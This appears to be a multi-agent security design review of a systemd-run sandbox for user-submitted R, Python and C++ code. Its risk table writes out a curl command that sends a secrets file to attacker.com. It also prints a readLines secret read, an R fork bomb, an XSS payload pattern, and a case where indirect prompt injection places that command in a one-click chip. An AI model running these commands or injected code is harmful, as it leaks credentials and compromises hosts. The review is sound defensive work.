## 🔴 Devil's Advocate

```
AGENT: Devil's Advocate
STANCE: REJECT
REASONING: The env-scrub claim is built on a false premise about the threat model. The sandboxed REPL spawns with `DynamicUser=yes` — UID is ephemeral (e.g. uid=62977), unrelated to `APP_USER=root` who owns `/opt/jarvis`. `ProtectSystem=strict` + `ProtectHome=yes` make `/etc`, `/usr`, `/boot`, `/home` read-only/inaccessible — but `/opt/jarvis/.env` (containing `OPENROUTER_API_KEY`, `JARVIS_AUTH_TOKEN`) is NOT under any of those paths. `ProtectSystem=strict` does NOT cover `/opt`, `/srv`, `/var`, `/root`, or `/mnt`. The file is mode 644 + owned by root, the Kotlin process reads it, and `systemd-run` from inside a service propagates the service's environment by default unless you pass `--setenv` plus a `--property=Environment=` reset. The proposal's env-scrub list is also incomplete (`HOME`, `USER`, `LOGNAME`, `XDG_*`, `LANG` aren't mentioned). The author conflated "PrivateTmp isolates /tmp" with "the sandbox cannot read secrets" — those are independent. Second concrete failure: cold-start latency. `DynamicUser=yes` adds nss-systemd lookup latency 400-800ms on stock Ubuntu 22.04; ggplot2 first-load + `pdf()`/`png()` device init burns 1.5-3s on a cold R session. `RuntimeMaxSec=8s` is wall-clock and includes setup overhead — user submits, waits 8s, sees timeout, debugging dead-end.
KEY CONCERN: The env-scrub does not actually scrub. `/opt/jarvis/.env` containing `OPENROUTER_API_KEY` + `JARVIS_AUTH_TOKEN` is reachable by the ephemeral uid via plain filesystem read (no `InaccessiblePaths=/opt/jarvis` or `ReadOnlyPaths=` in the proposal), AND `systemd-run` from inside the jarvis service does not by default purge the parent's environment block. Slice 3 is not shippable until the proposal adds (a) `InaccessiblePaths=/opt/jarvis /root/.jarvis /var/log/jarvis.log /etc/jarvis`, (b) `RootDirectory=` or explicit `BindReadOnlyPaths=` to a minimal jail, (c) a concrete acceptance test: `systemd-run [flags] -- env | grep -E 'OPENROUTER|JARVIS'` returns empty AND `systemd-run [flags] -- cat /opt/jarvis/.env` returns Permission denied.
```

## 📚 Domain Expert

```
AGENT: Domain Expert
STANCE: CONDITIONAL
REASONING: The per-invocation sandbox model is the established pattern for exam-prep / online-judge surfaces (LeetCode, HackerRank, Codeforces, Exercism, Codecademy all use fresh containers per submission via judges like Isolate/nsjail) — kernel-per-session (Jupyter/Binder/Colab) is the wrong lineage here. Plot-via-tempfile + base64 over JSON is the exact convention rmarkdown/knitr, Jupyter's display_data, and the R-fiddle/DataCamp light-IDE family all use — for ggplot specifically the idiomatic pipeline is `png("/tmp/p.png",...); print(plot); dev.off()` wrapped around user code, then base64 inline. However, **systemd-run as the sandbox is genuinely unusual** for this use case: the prior art is overwhelmingly nsjail (Google's judge), Isolate (the IOI/Codeforces reference judge by Mareš — literally written for this problem), bubblewrap (Flatpak), or Firecracker microVMs (Repl.it). systemd-run gives you DynamicUser+ProtectSystem cheaply but lacks filesystem-overlay + seccomp-bpf granularity. The 8s / 256M defaults are reasonable for R/Python but tight for C++ (LeetCode 10s wall + 256MB; Codeforces 1-5s on pre-compiled binaries — compile+run-in-one needs ~3s for g++ alone on cold cache).
KEY CONCERN: Re-implementing a sandbox via raw systemd-run when Isolate (the literal reference implementation for competitive-programming judges, written for IOI) exists and solves exactly this problem with proven seccomp profiles, fork-limits, and separated compile/run budgets — you will reinvent fork-bomb protection, PID namespace isolation, and per-language metadata capture that Isolate ships. If you must stay in the systemd family, add `-p TasksMax=32` and `-p LimitNPROC=32` explicitly (DynamicUser alone won't stop a fork bomb from saturating the cgroup PID counter) and drop syscalls via `-p SystemCallFilter=@system-service` + denylist `@mount @debug @cpu-emulation`. Bundling R+C+++Python in one slice is *not* the proven shape — Exercism, learnr, and DataCamp all ship per-language surfaces because the compile/interpret/plot pipelines diverge sharply; ship R first (highest plot-pedagogy value for PS finals), then Python, then C++ as a separate slice with its own compile-cache story.
```

## ⚠️ Risk Analyst

```
AGENT: Risk Analyst
STANCE: CONDITIONAL
REASONING: The hardening profile is solid for the obvious attacks (process escape, fs read, fork-bomb cgroup kill), but three concrete failure modes break the slice as proposed: (a) the JVM service runs as root, so `systemd-run` inherits root capability to launch the transient unit — that's a giant blast radius if anything in the request path is exploitable; (b) the Sidekick→REPL auto-prefill creates an indirect prompt-injection sink where the LLM can pin arbitrary code into Alex's REPL chip without explicit consent — even if `(run:r)` doesn't auto-execute, a single-click chip with attacker-controlled body is functionally equivalent given Alex's UX trust; (c) the plot pipeline has no size cap before base64+JSON encode, so a 1-line R/Python that writes a giant PNG OOMs the JVM. Sandbox escape via `system("cat /etc/jarvis/.env")` is the highest-severity unsolved: `ProtectSystem=strict` makes `/etc` read-only but NOT unreadable; secrets at `/opt/jarvis/.env` are world-readable unless explicitly chmod'd. Fix the env-secret read path, add output size caps, and require explicit-click (no auto-exec) on Sidekick chips, then approve.
KEY CONCERN: `system("readLines('/opt/jarvis/.env'))` from inside R/Python sandbox returns the OPENROUTER_API_KEY and `jarvis_auth` token verbatim if `/opt/jarvis/.env` is mode 644 or readable by the DynamicUser uid. `ProtectSystem=strict` only makes `/usr`, `/boot`, `/efi` read-only; `/opt` is NOT covered. `ProtectHome=yes` blocks `/home`, `/root`, `/run/user` but NOT `/opt`. Need `InaccessiblePaths=/opt/jarvis` or `ReadOnlyPaths=` + chmod 600 on the env file owned by the jarvis service user (which currently doesn't exist — service runs as root).
RISK TABLE:
  - [CRITICAL] Sandbox reads `/opt/jarvis/.env` via R's `readLines` or Python's `open()` → OPENROUTER_API_KEY + jarvis_auth token exfiltrated to Alex's screen and (if Sidekick handoff exists) into LLM upstream — full app compromise, paid API abuse, free-tier rate-limit ban
  - [CRITICAL] LLM emits `(run:r) system("curl -X POST attacker.com -d $(cat /opt/jarvis/.env)")` as a chip; Alex single-clicks → indirect prompt injection becomes RCE-on-VPS via the sandbox network (sandbox does NOT block egress unless `PrivateNetwork=yes` or `IPAddressDeny=any` is set)
  - [HIGH] JVM service runs as root → if any code path in `/api/v1/repl/run` has a deserialization bug, command injection, or path traversal BEFORE the systemd-run boundary, attacker gets root on VPS.
  - [HIGH] Plot 100MB PNG → base64 (133MB) → JSON-encoded as String in JVM heap → OOM kills the entire jarvis service for all features. Need hard cap (e.g., 2MB PNG max) BEFORE read+encode, plus `LimitFSIZE` on the systemd-run unit.
  - [HIGH] `(run:r)` regex extraction renders LLM-controlled strings as HTML chips. If `dangerouslySetInnerHTML` or unescaped React text touches the code body, XSS through `<img onerror=...>` pops Alex's session — exfiltrates jarvis_auth cookie. Render as plain `<code>{text}</code>` only.
  - [HIGH] R fork bomb: `parallel::mclapply(1:1000, function(i) system("sleep 999"))` — `RuntimeMaxSec=8s` kills cgroup, but during the 8s window up to thousands of pids spawn. No `TasksMax=` flag in proposal.
  - [MEDIUM] Kotlin `runBlocking { process.waitFor() }` if killed by TERM but stdio FDs stay open → JVM thread parked indefinitely. After ~100 invocations, Ktor thread pool exhausted. Mitigation: `process.waitFor(10, TimeUnit.SECONDS)` + `destroyForcibly()` + drain stdout/stderr in dedicated threads.
  - [MEDIUM] Concurrent "▶ run" double-click: two transient units, frontend `setReplOutput` race. Mitigation: client-side debounce + AbortController OR server-side request id.
  - [MEDIUM] C++ `g++ -O0` cold compile of <iostream>+template-heavy STL = 600-1500ms on single-vCPU VPS. 8s wall leaves 6.5s for execution. Need compile/run budget split.
  - [MEDIUM] VGAM/R package fragility: today's gfortran failure proves the install graph is brittle. Pin R + critical packages + Ktor health probe that runs `Rscript -e '1+1'` on boot.
  - [LOW] PrivateTmp leaves no persistent artifact; if Alex generates 1.5MB plot on flaky network, JSON truncates. Server-side cache keyed by request id for >100KB.
```
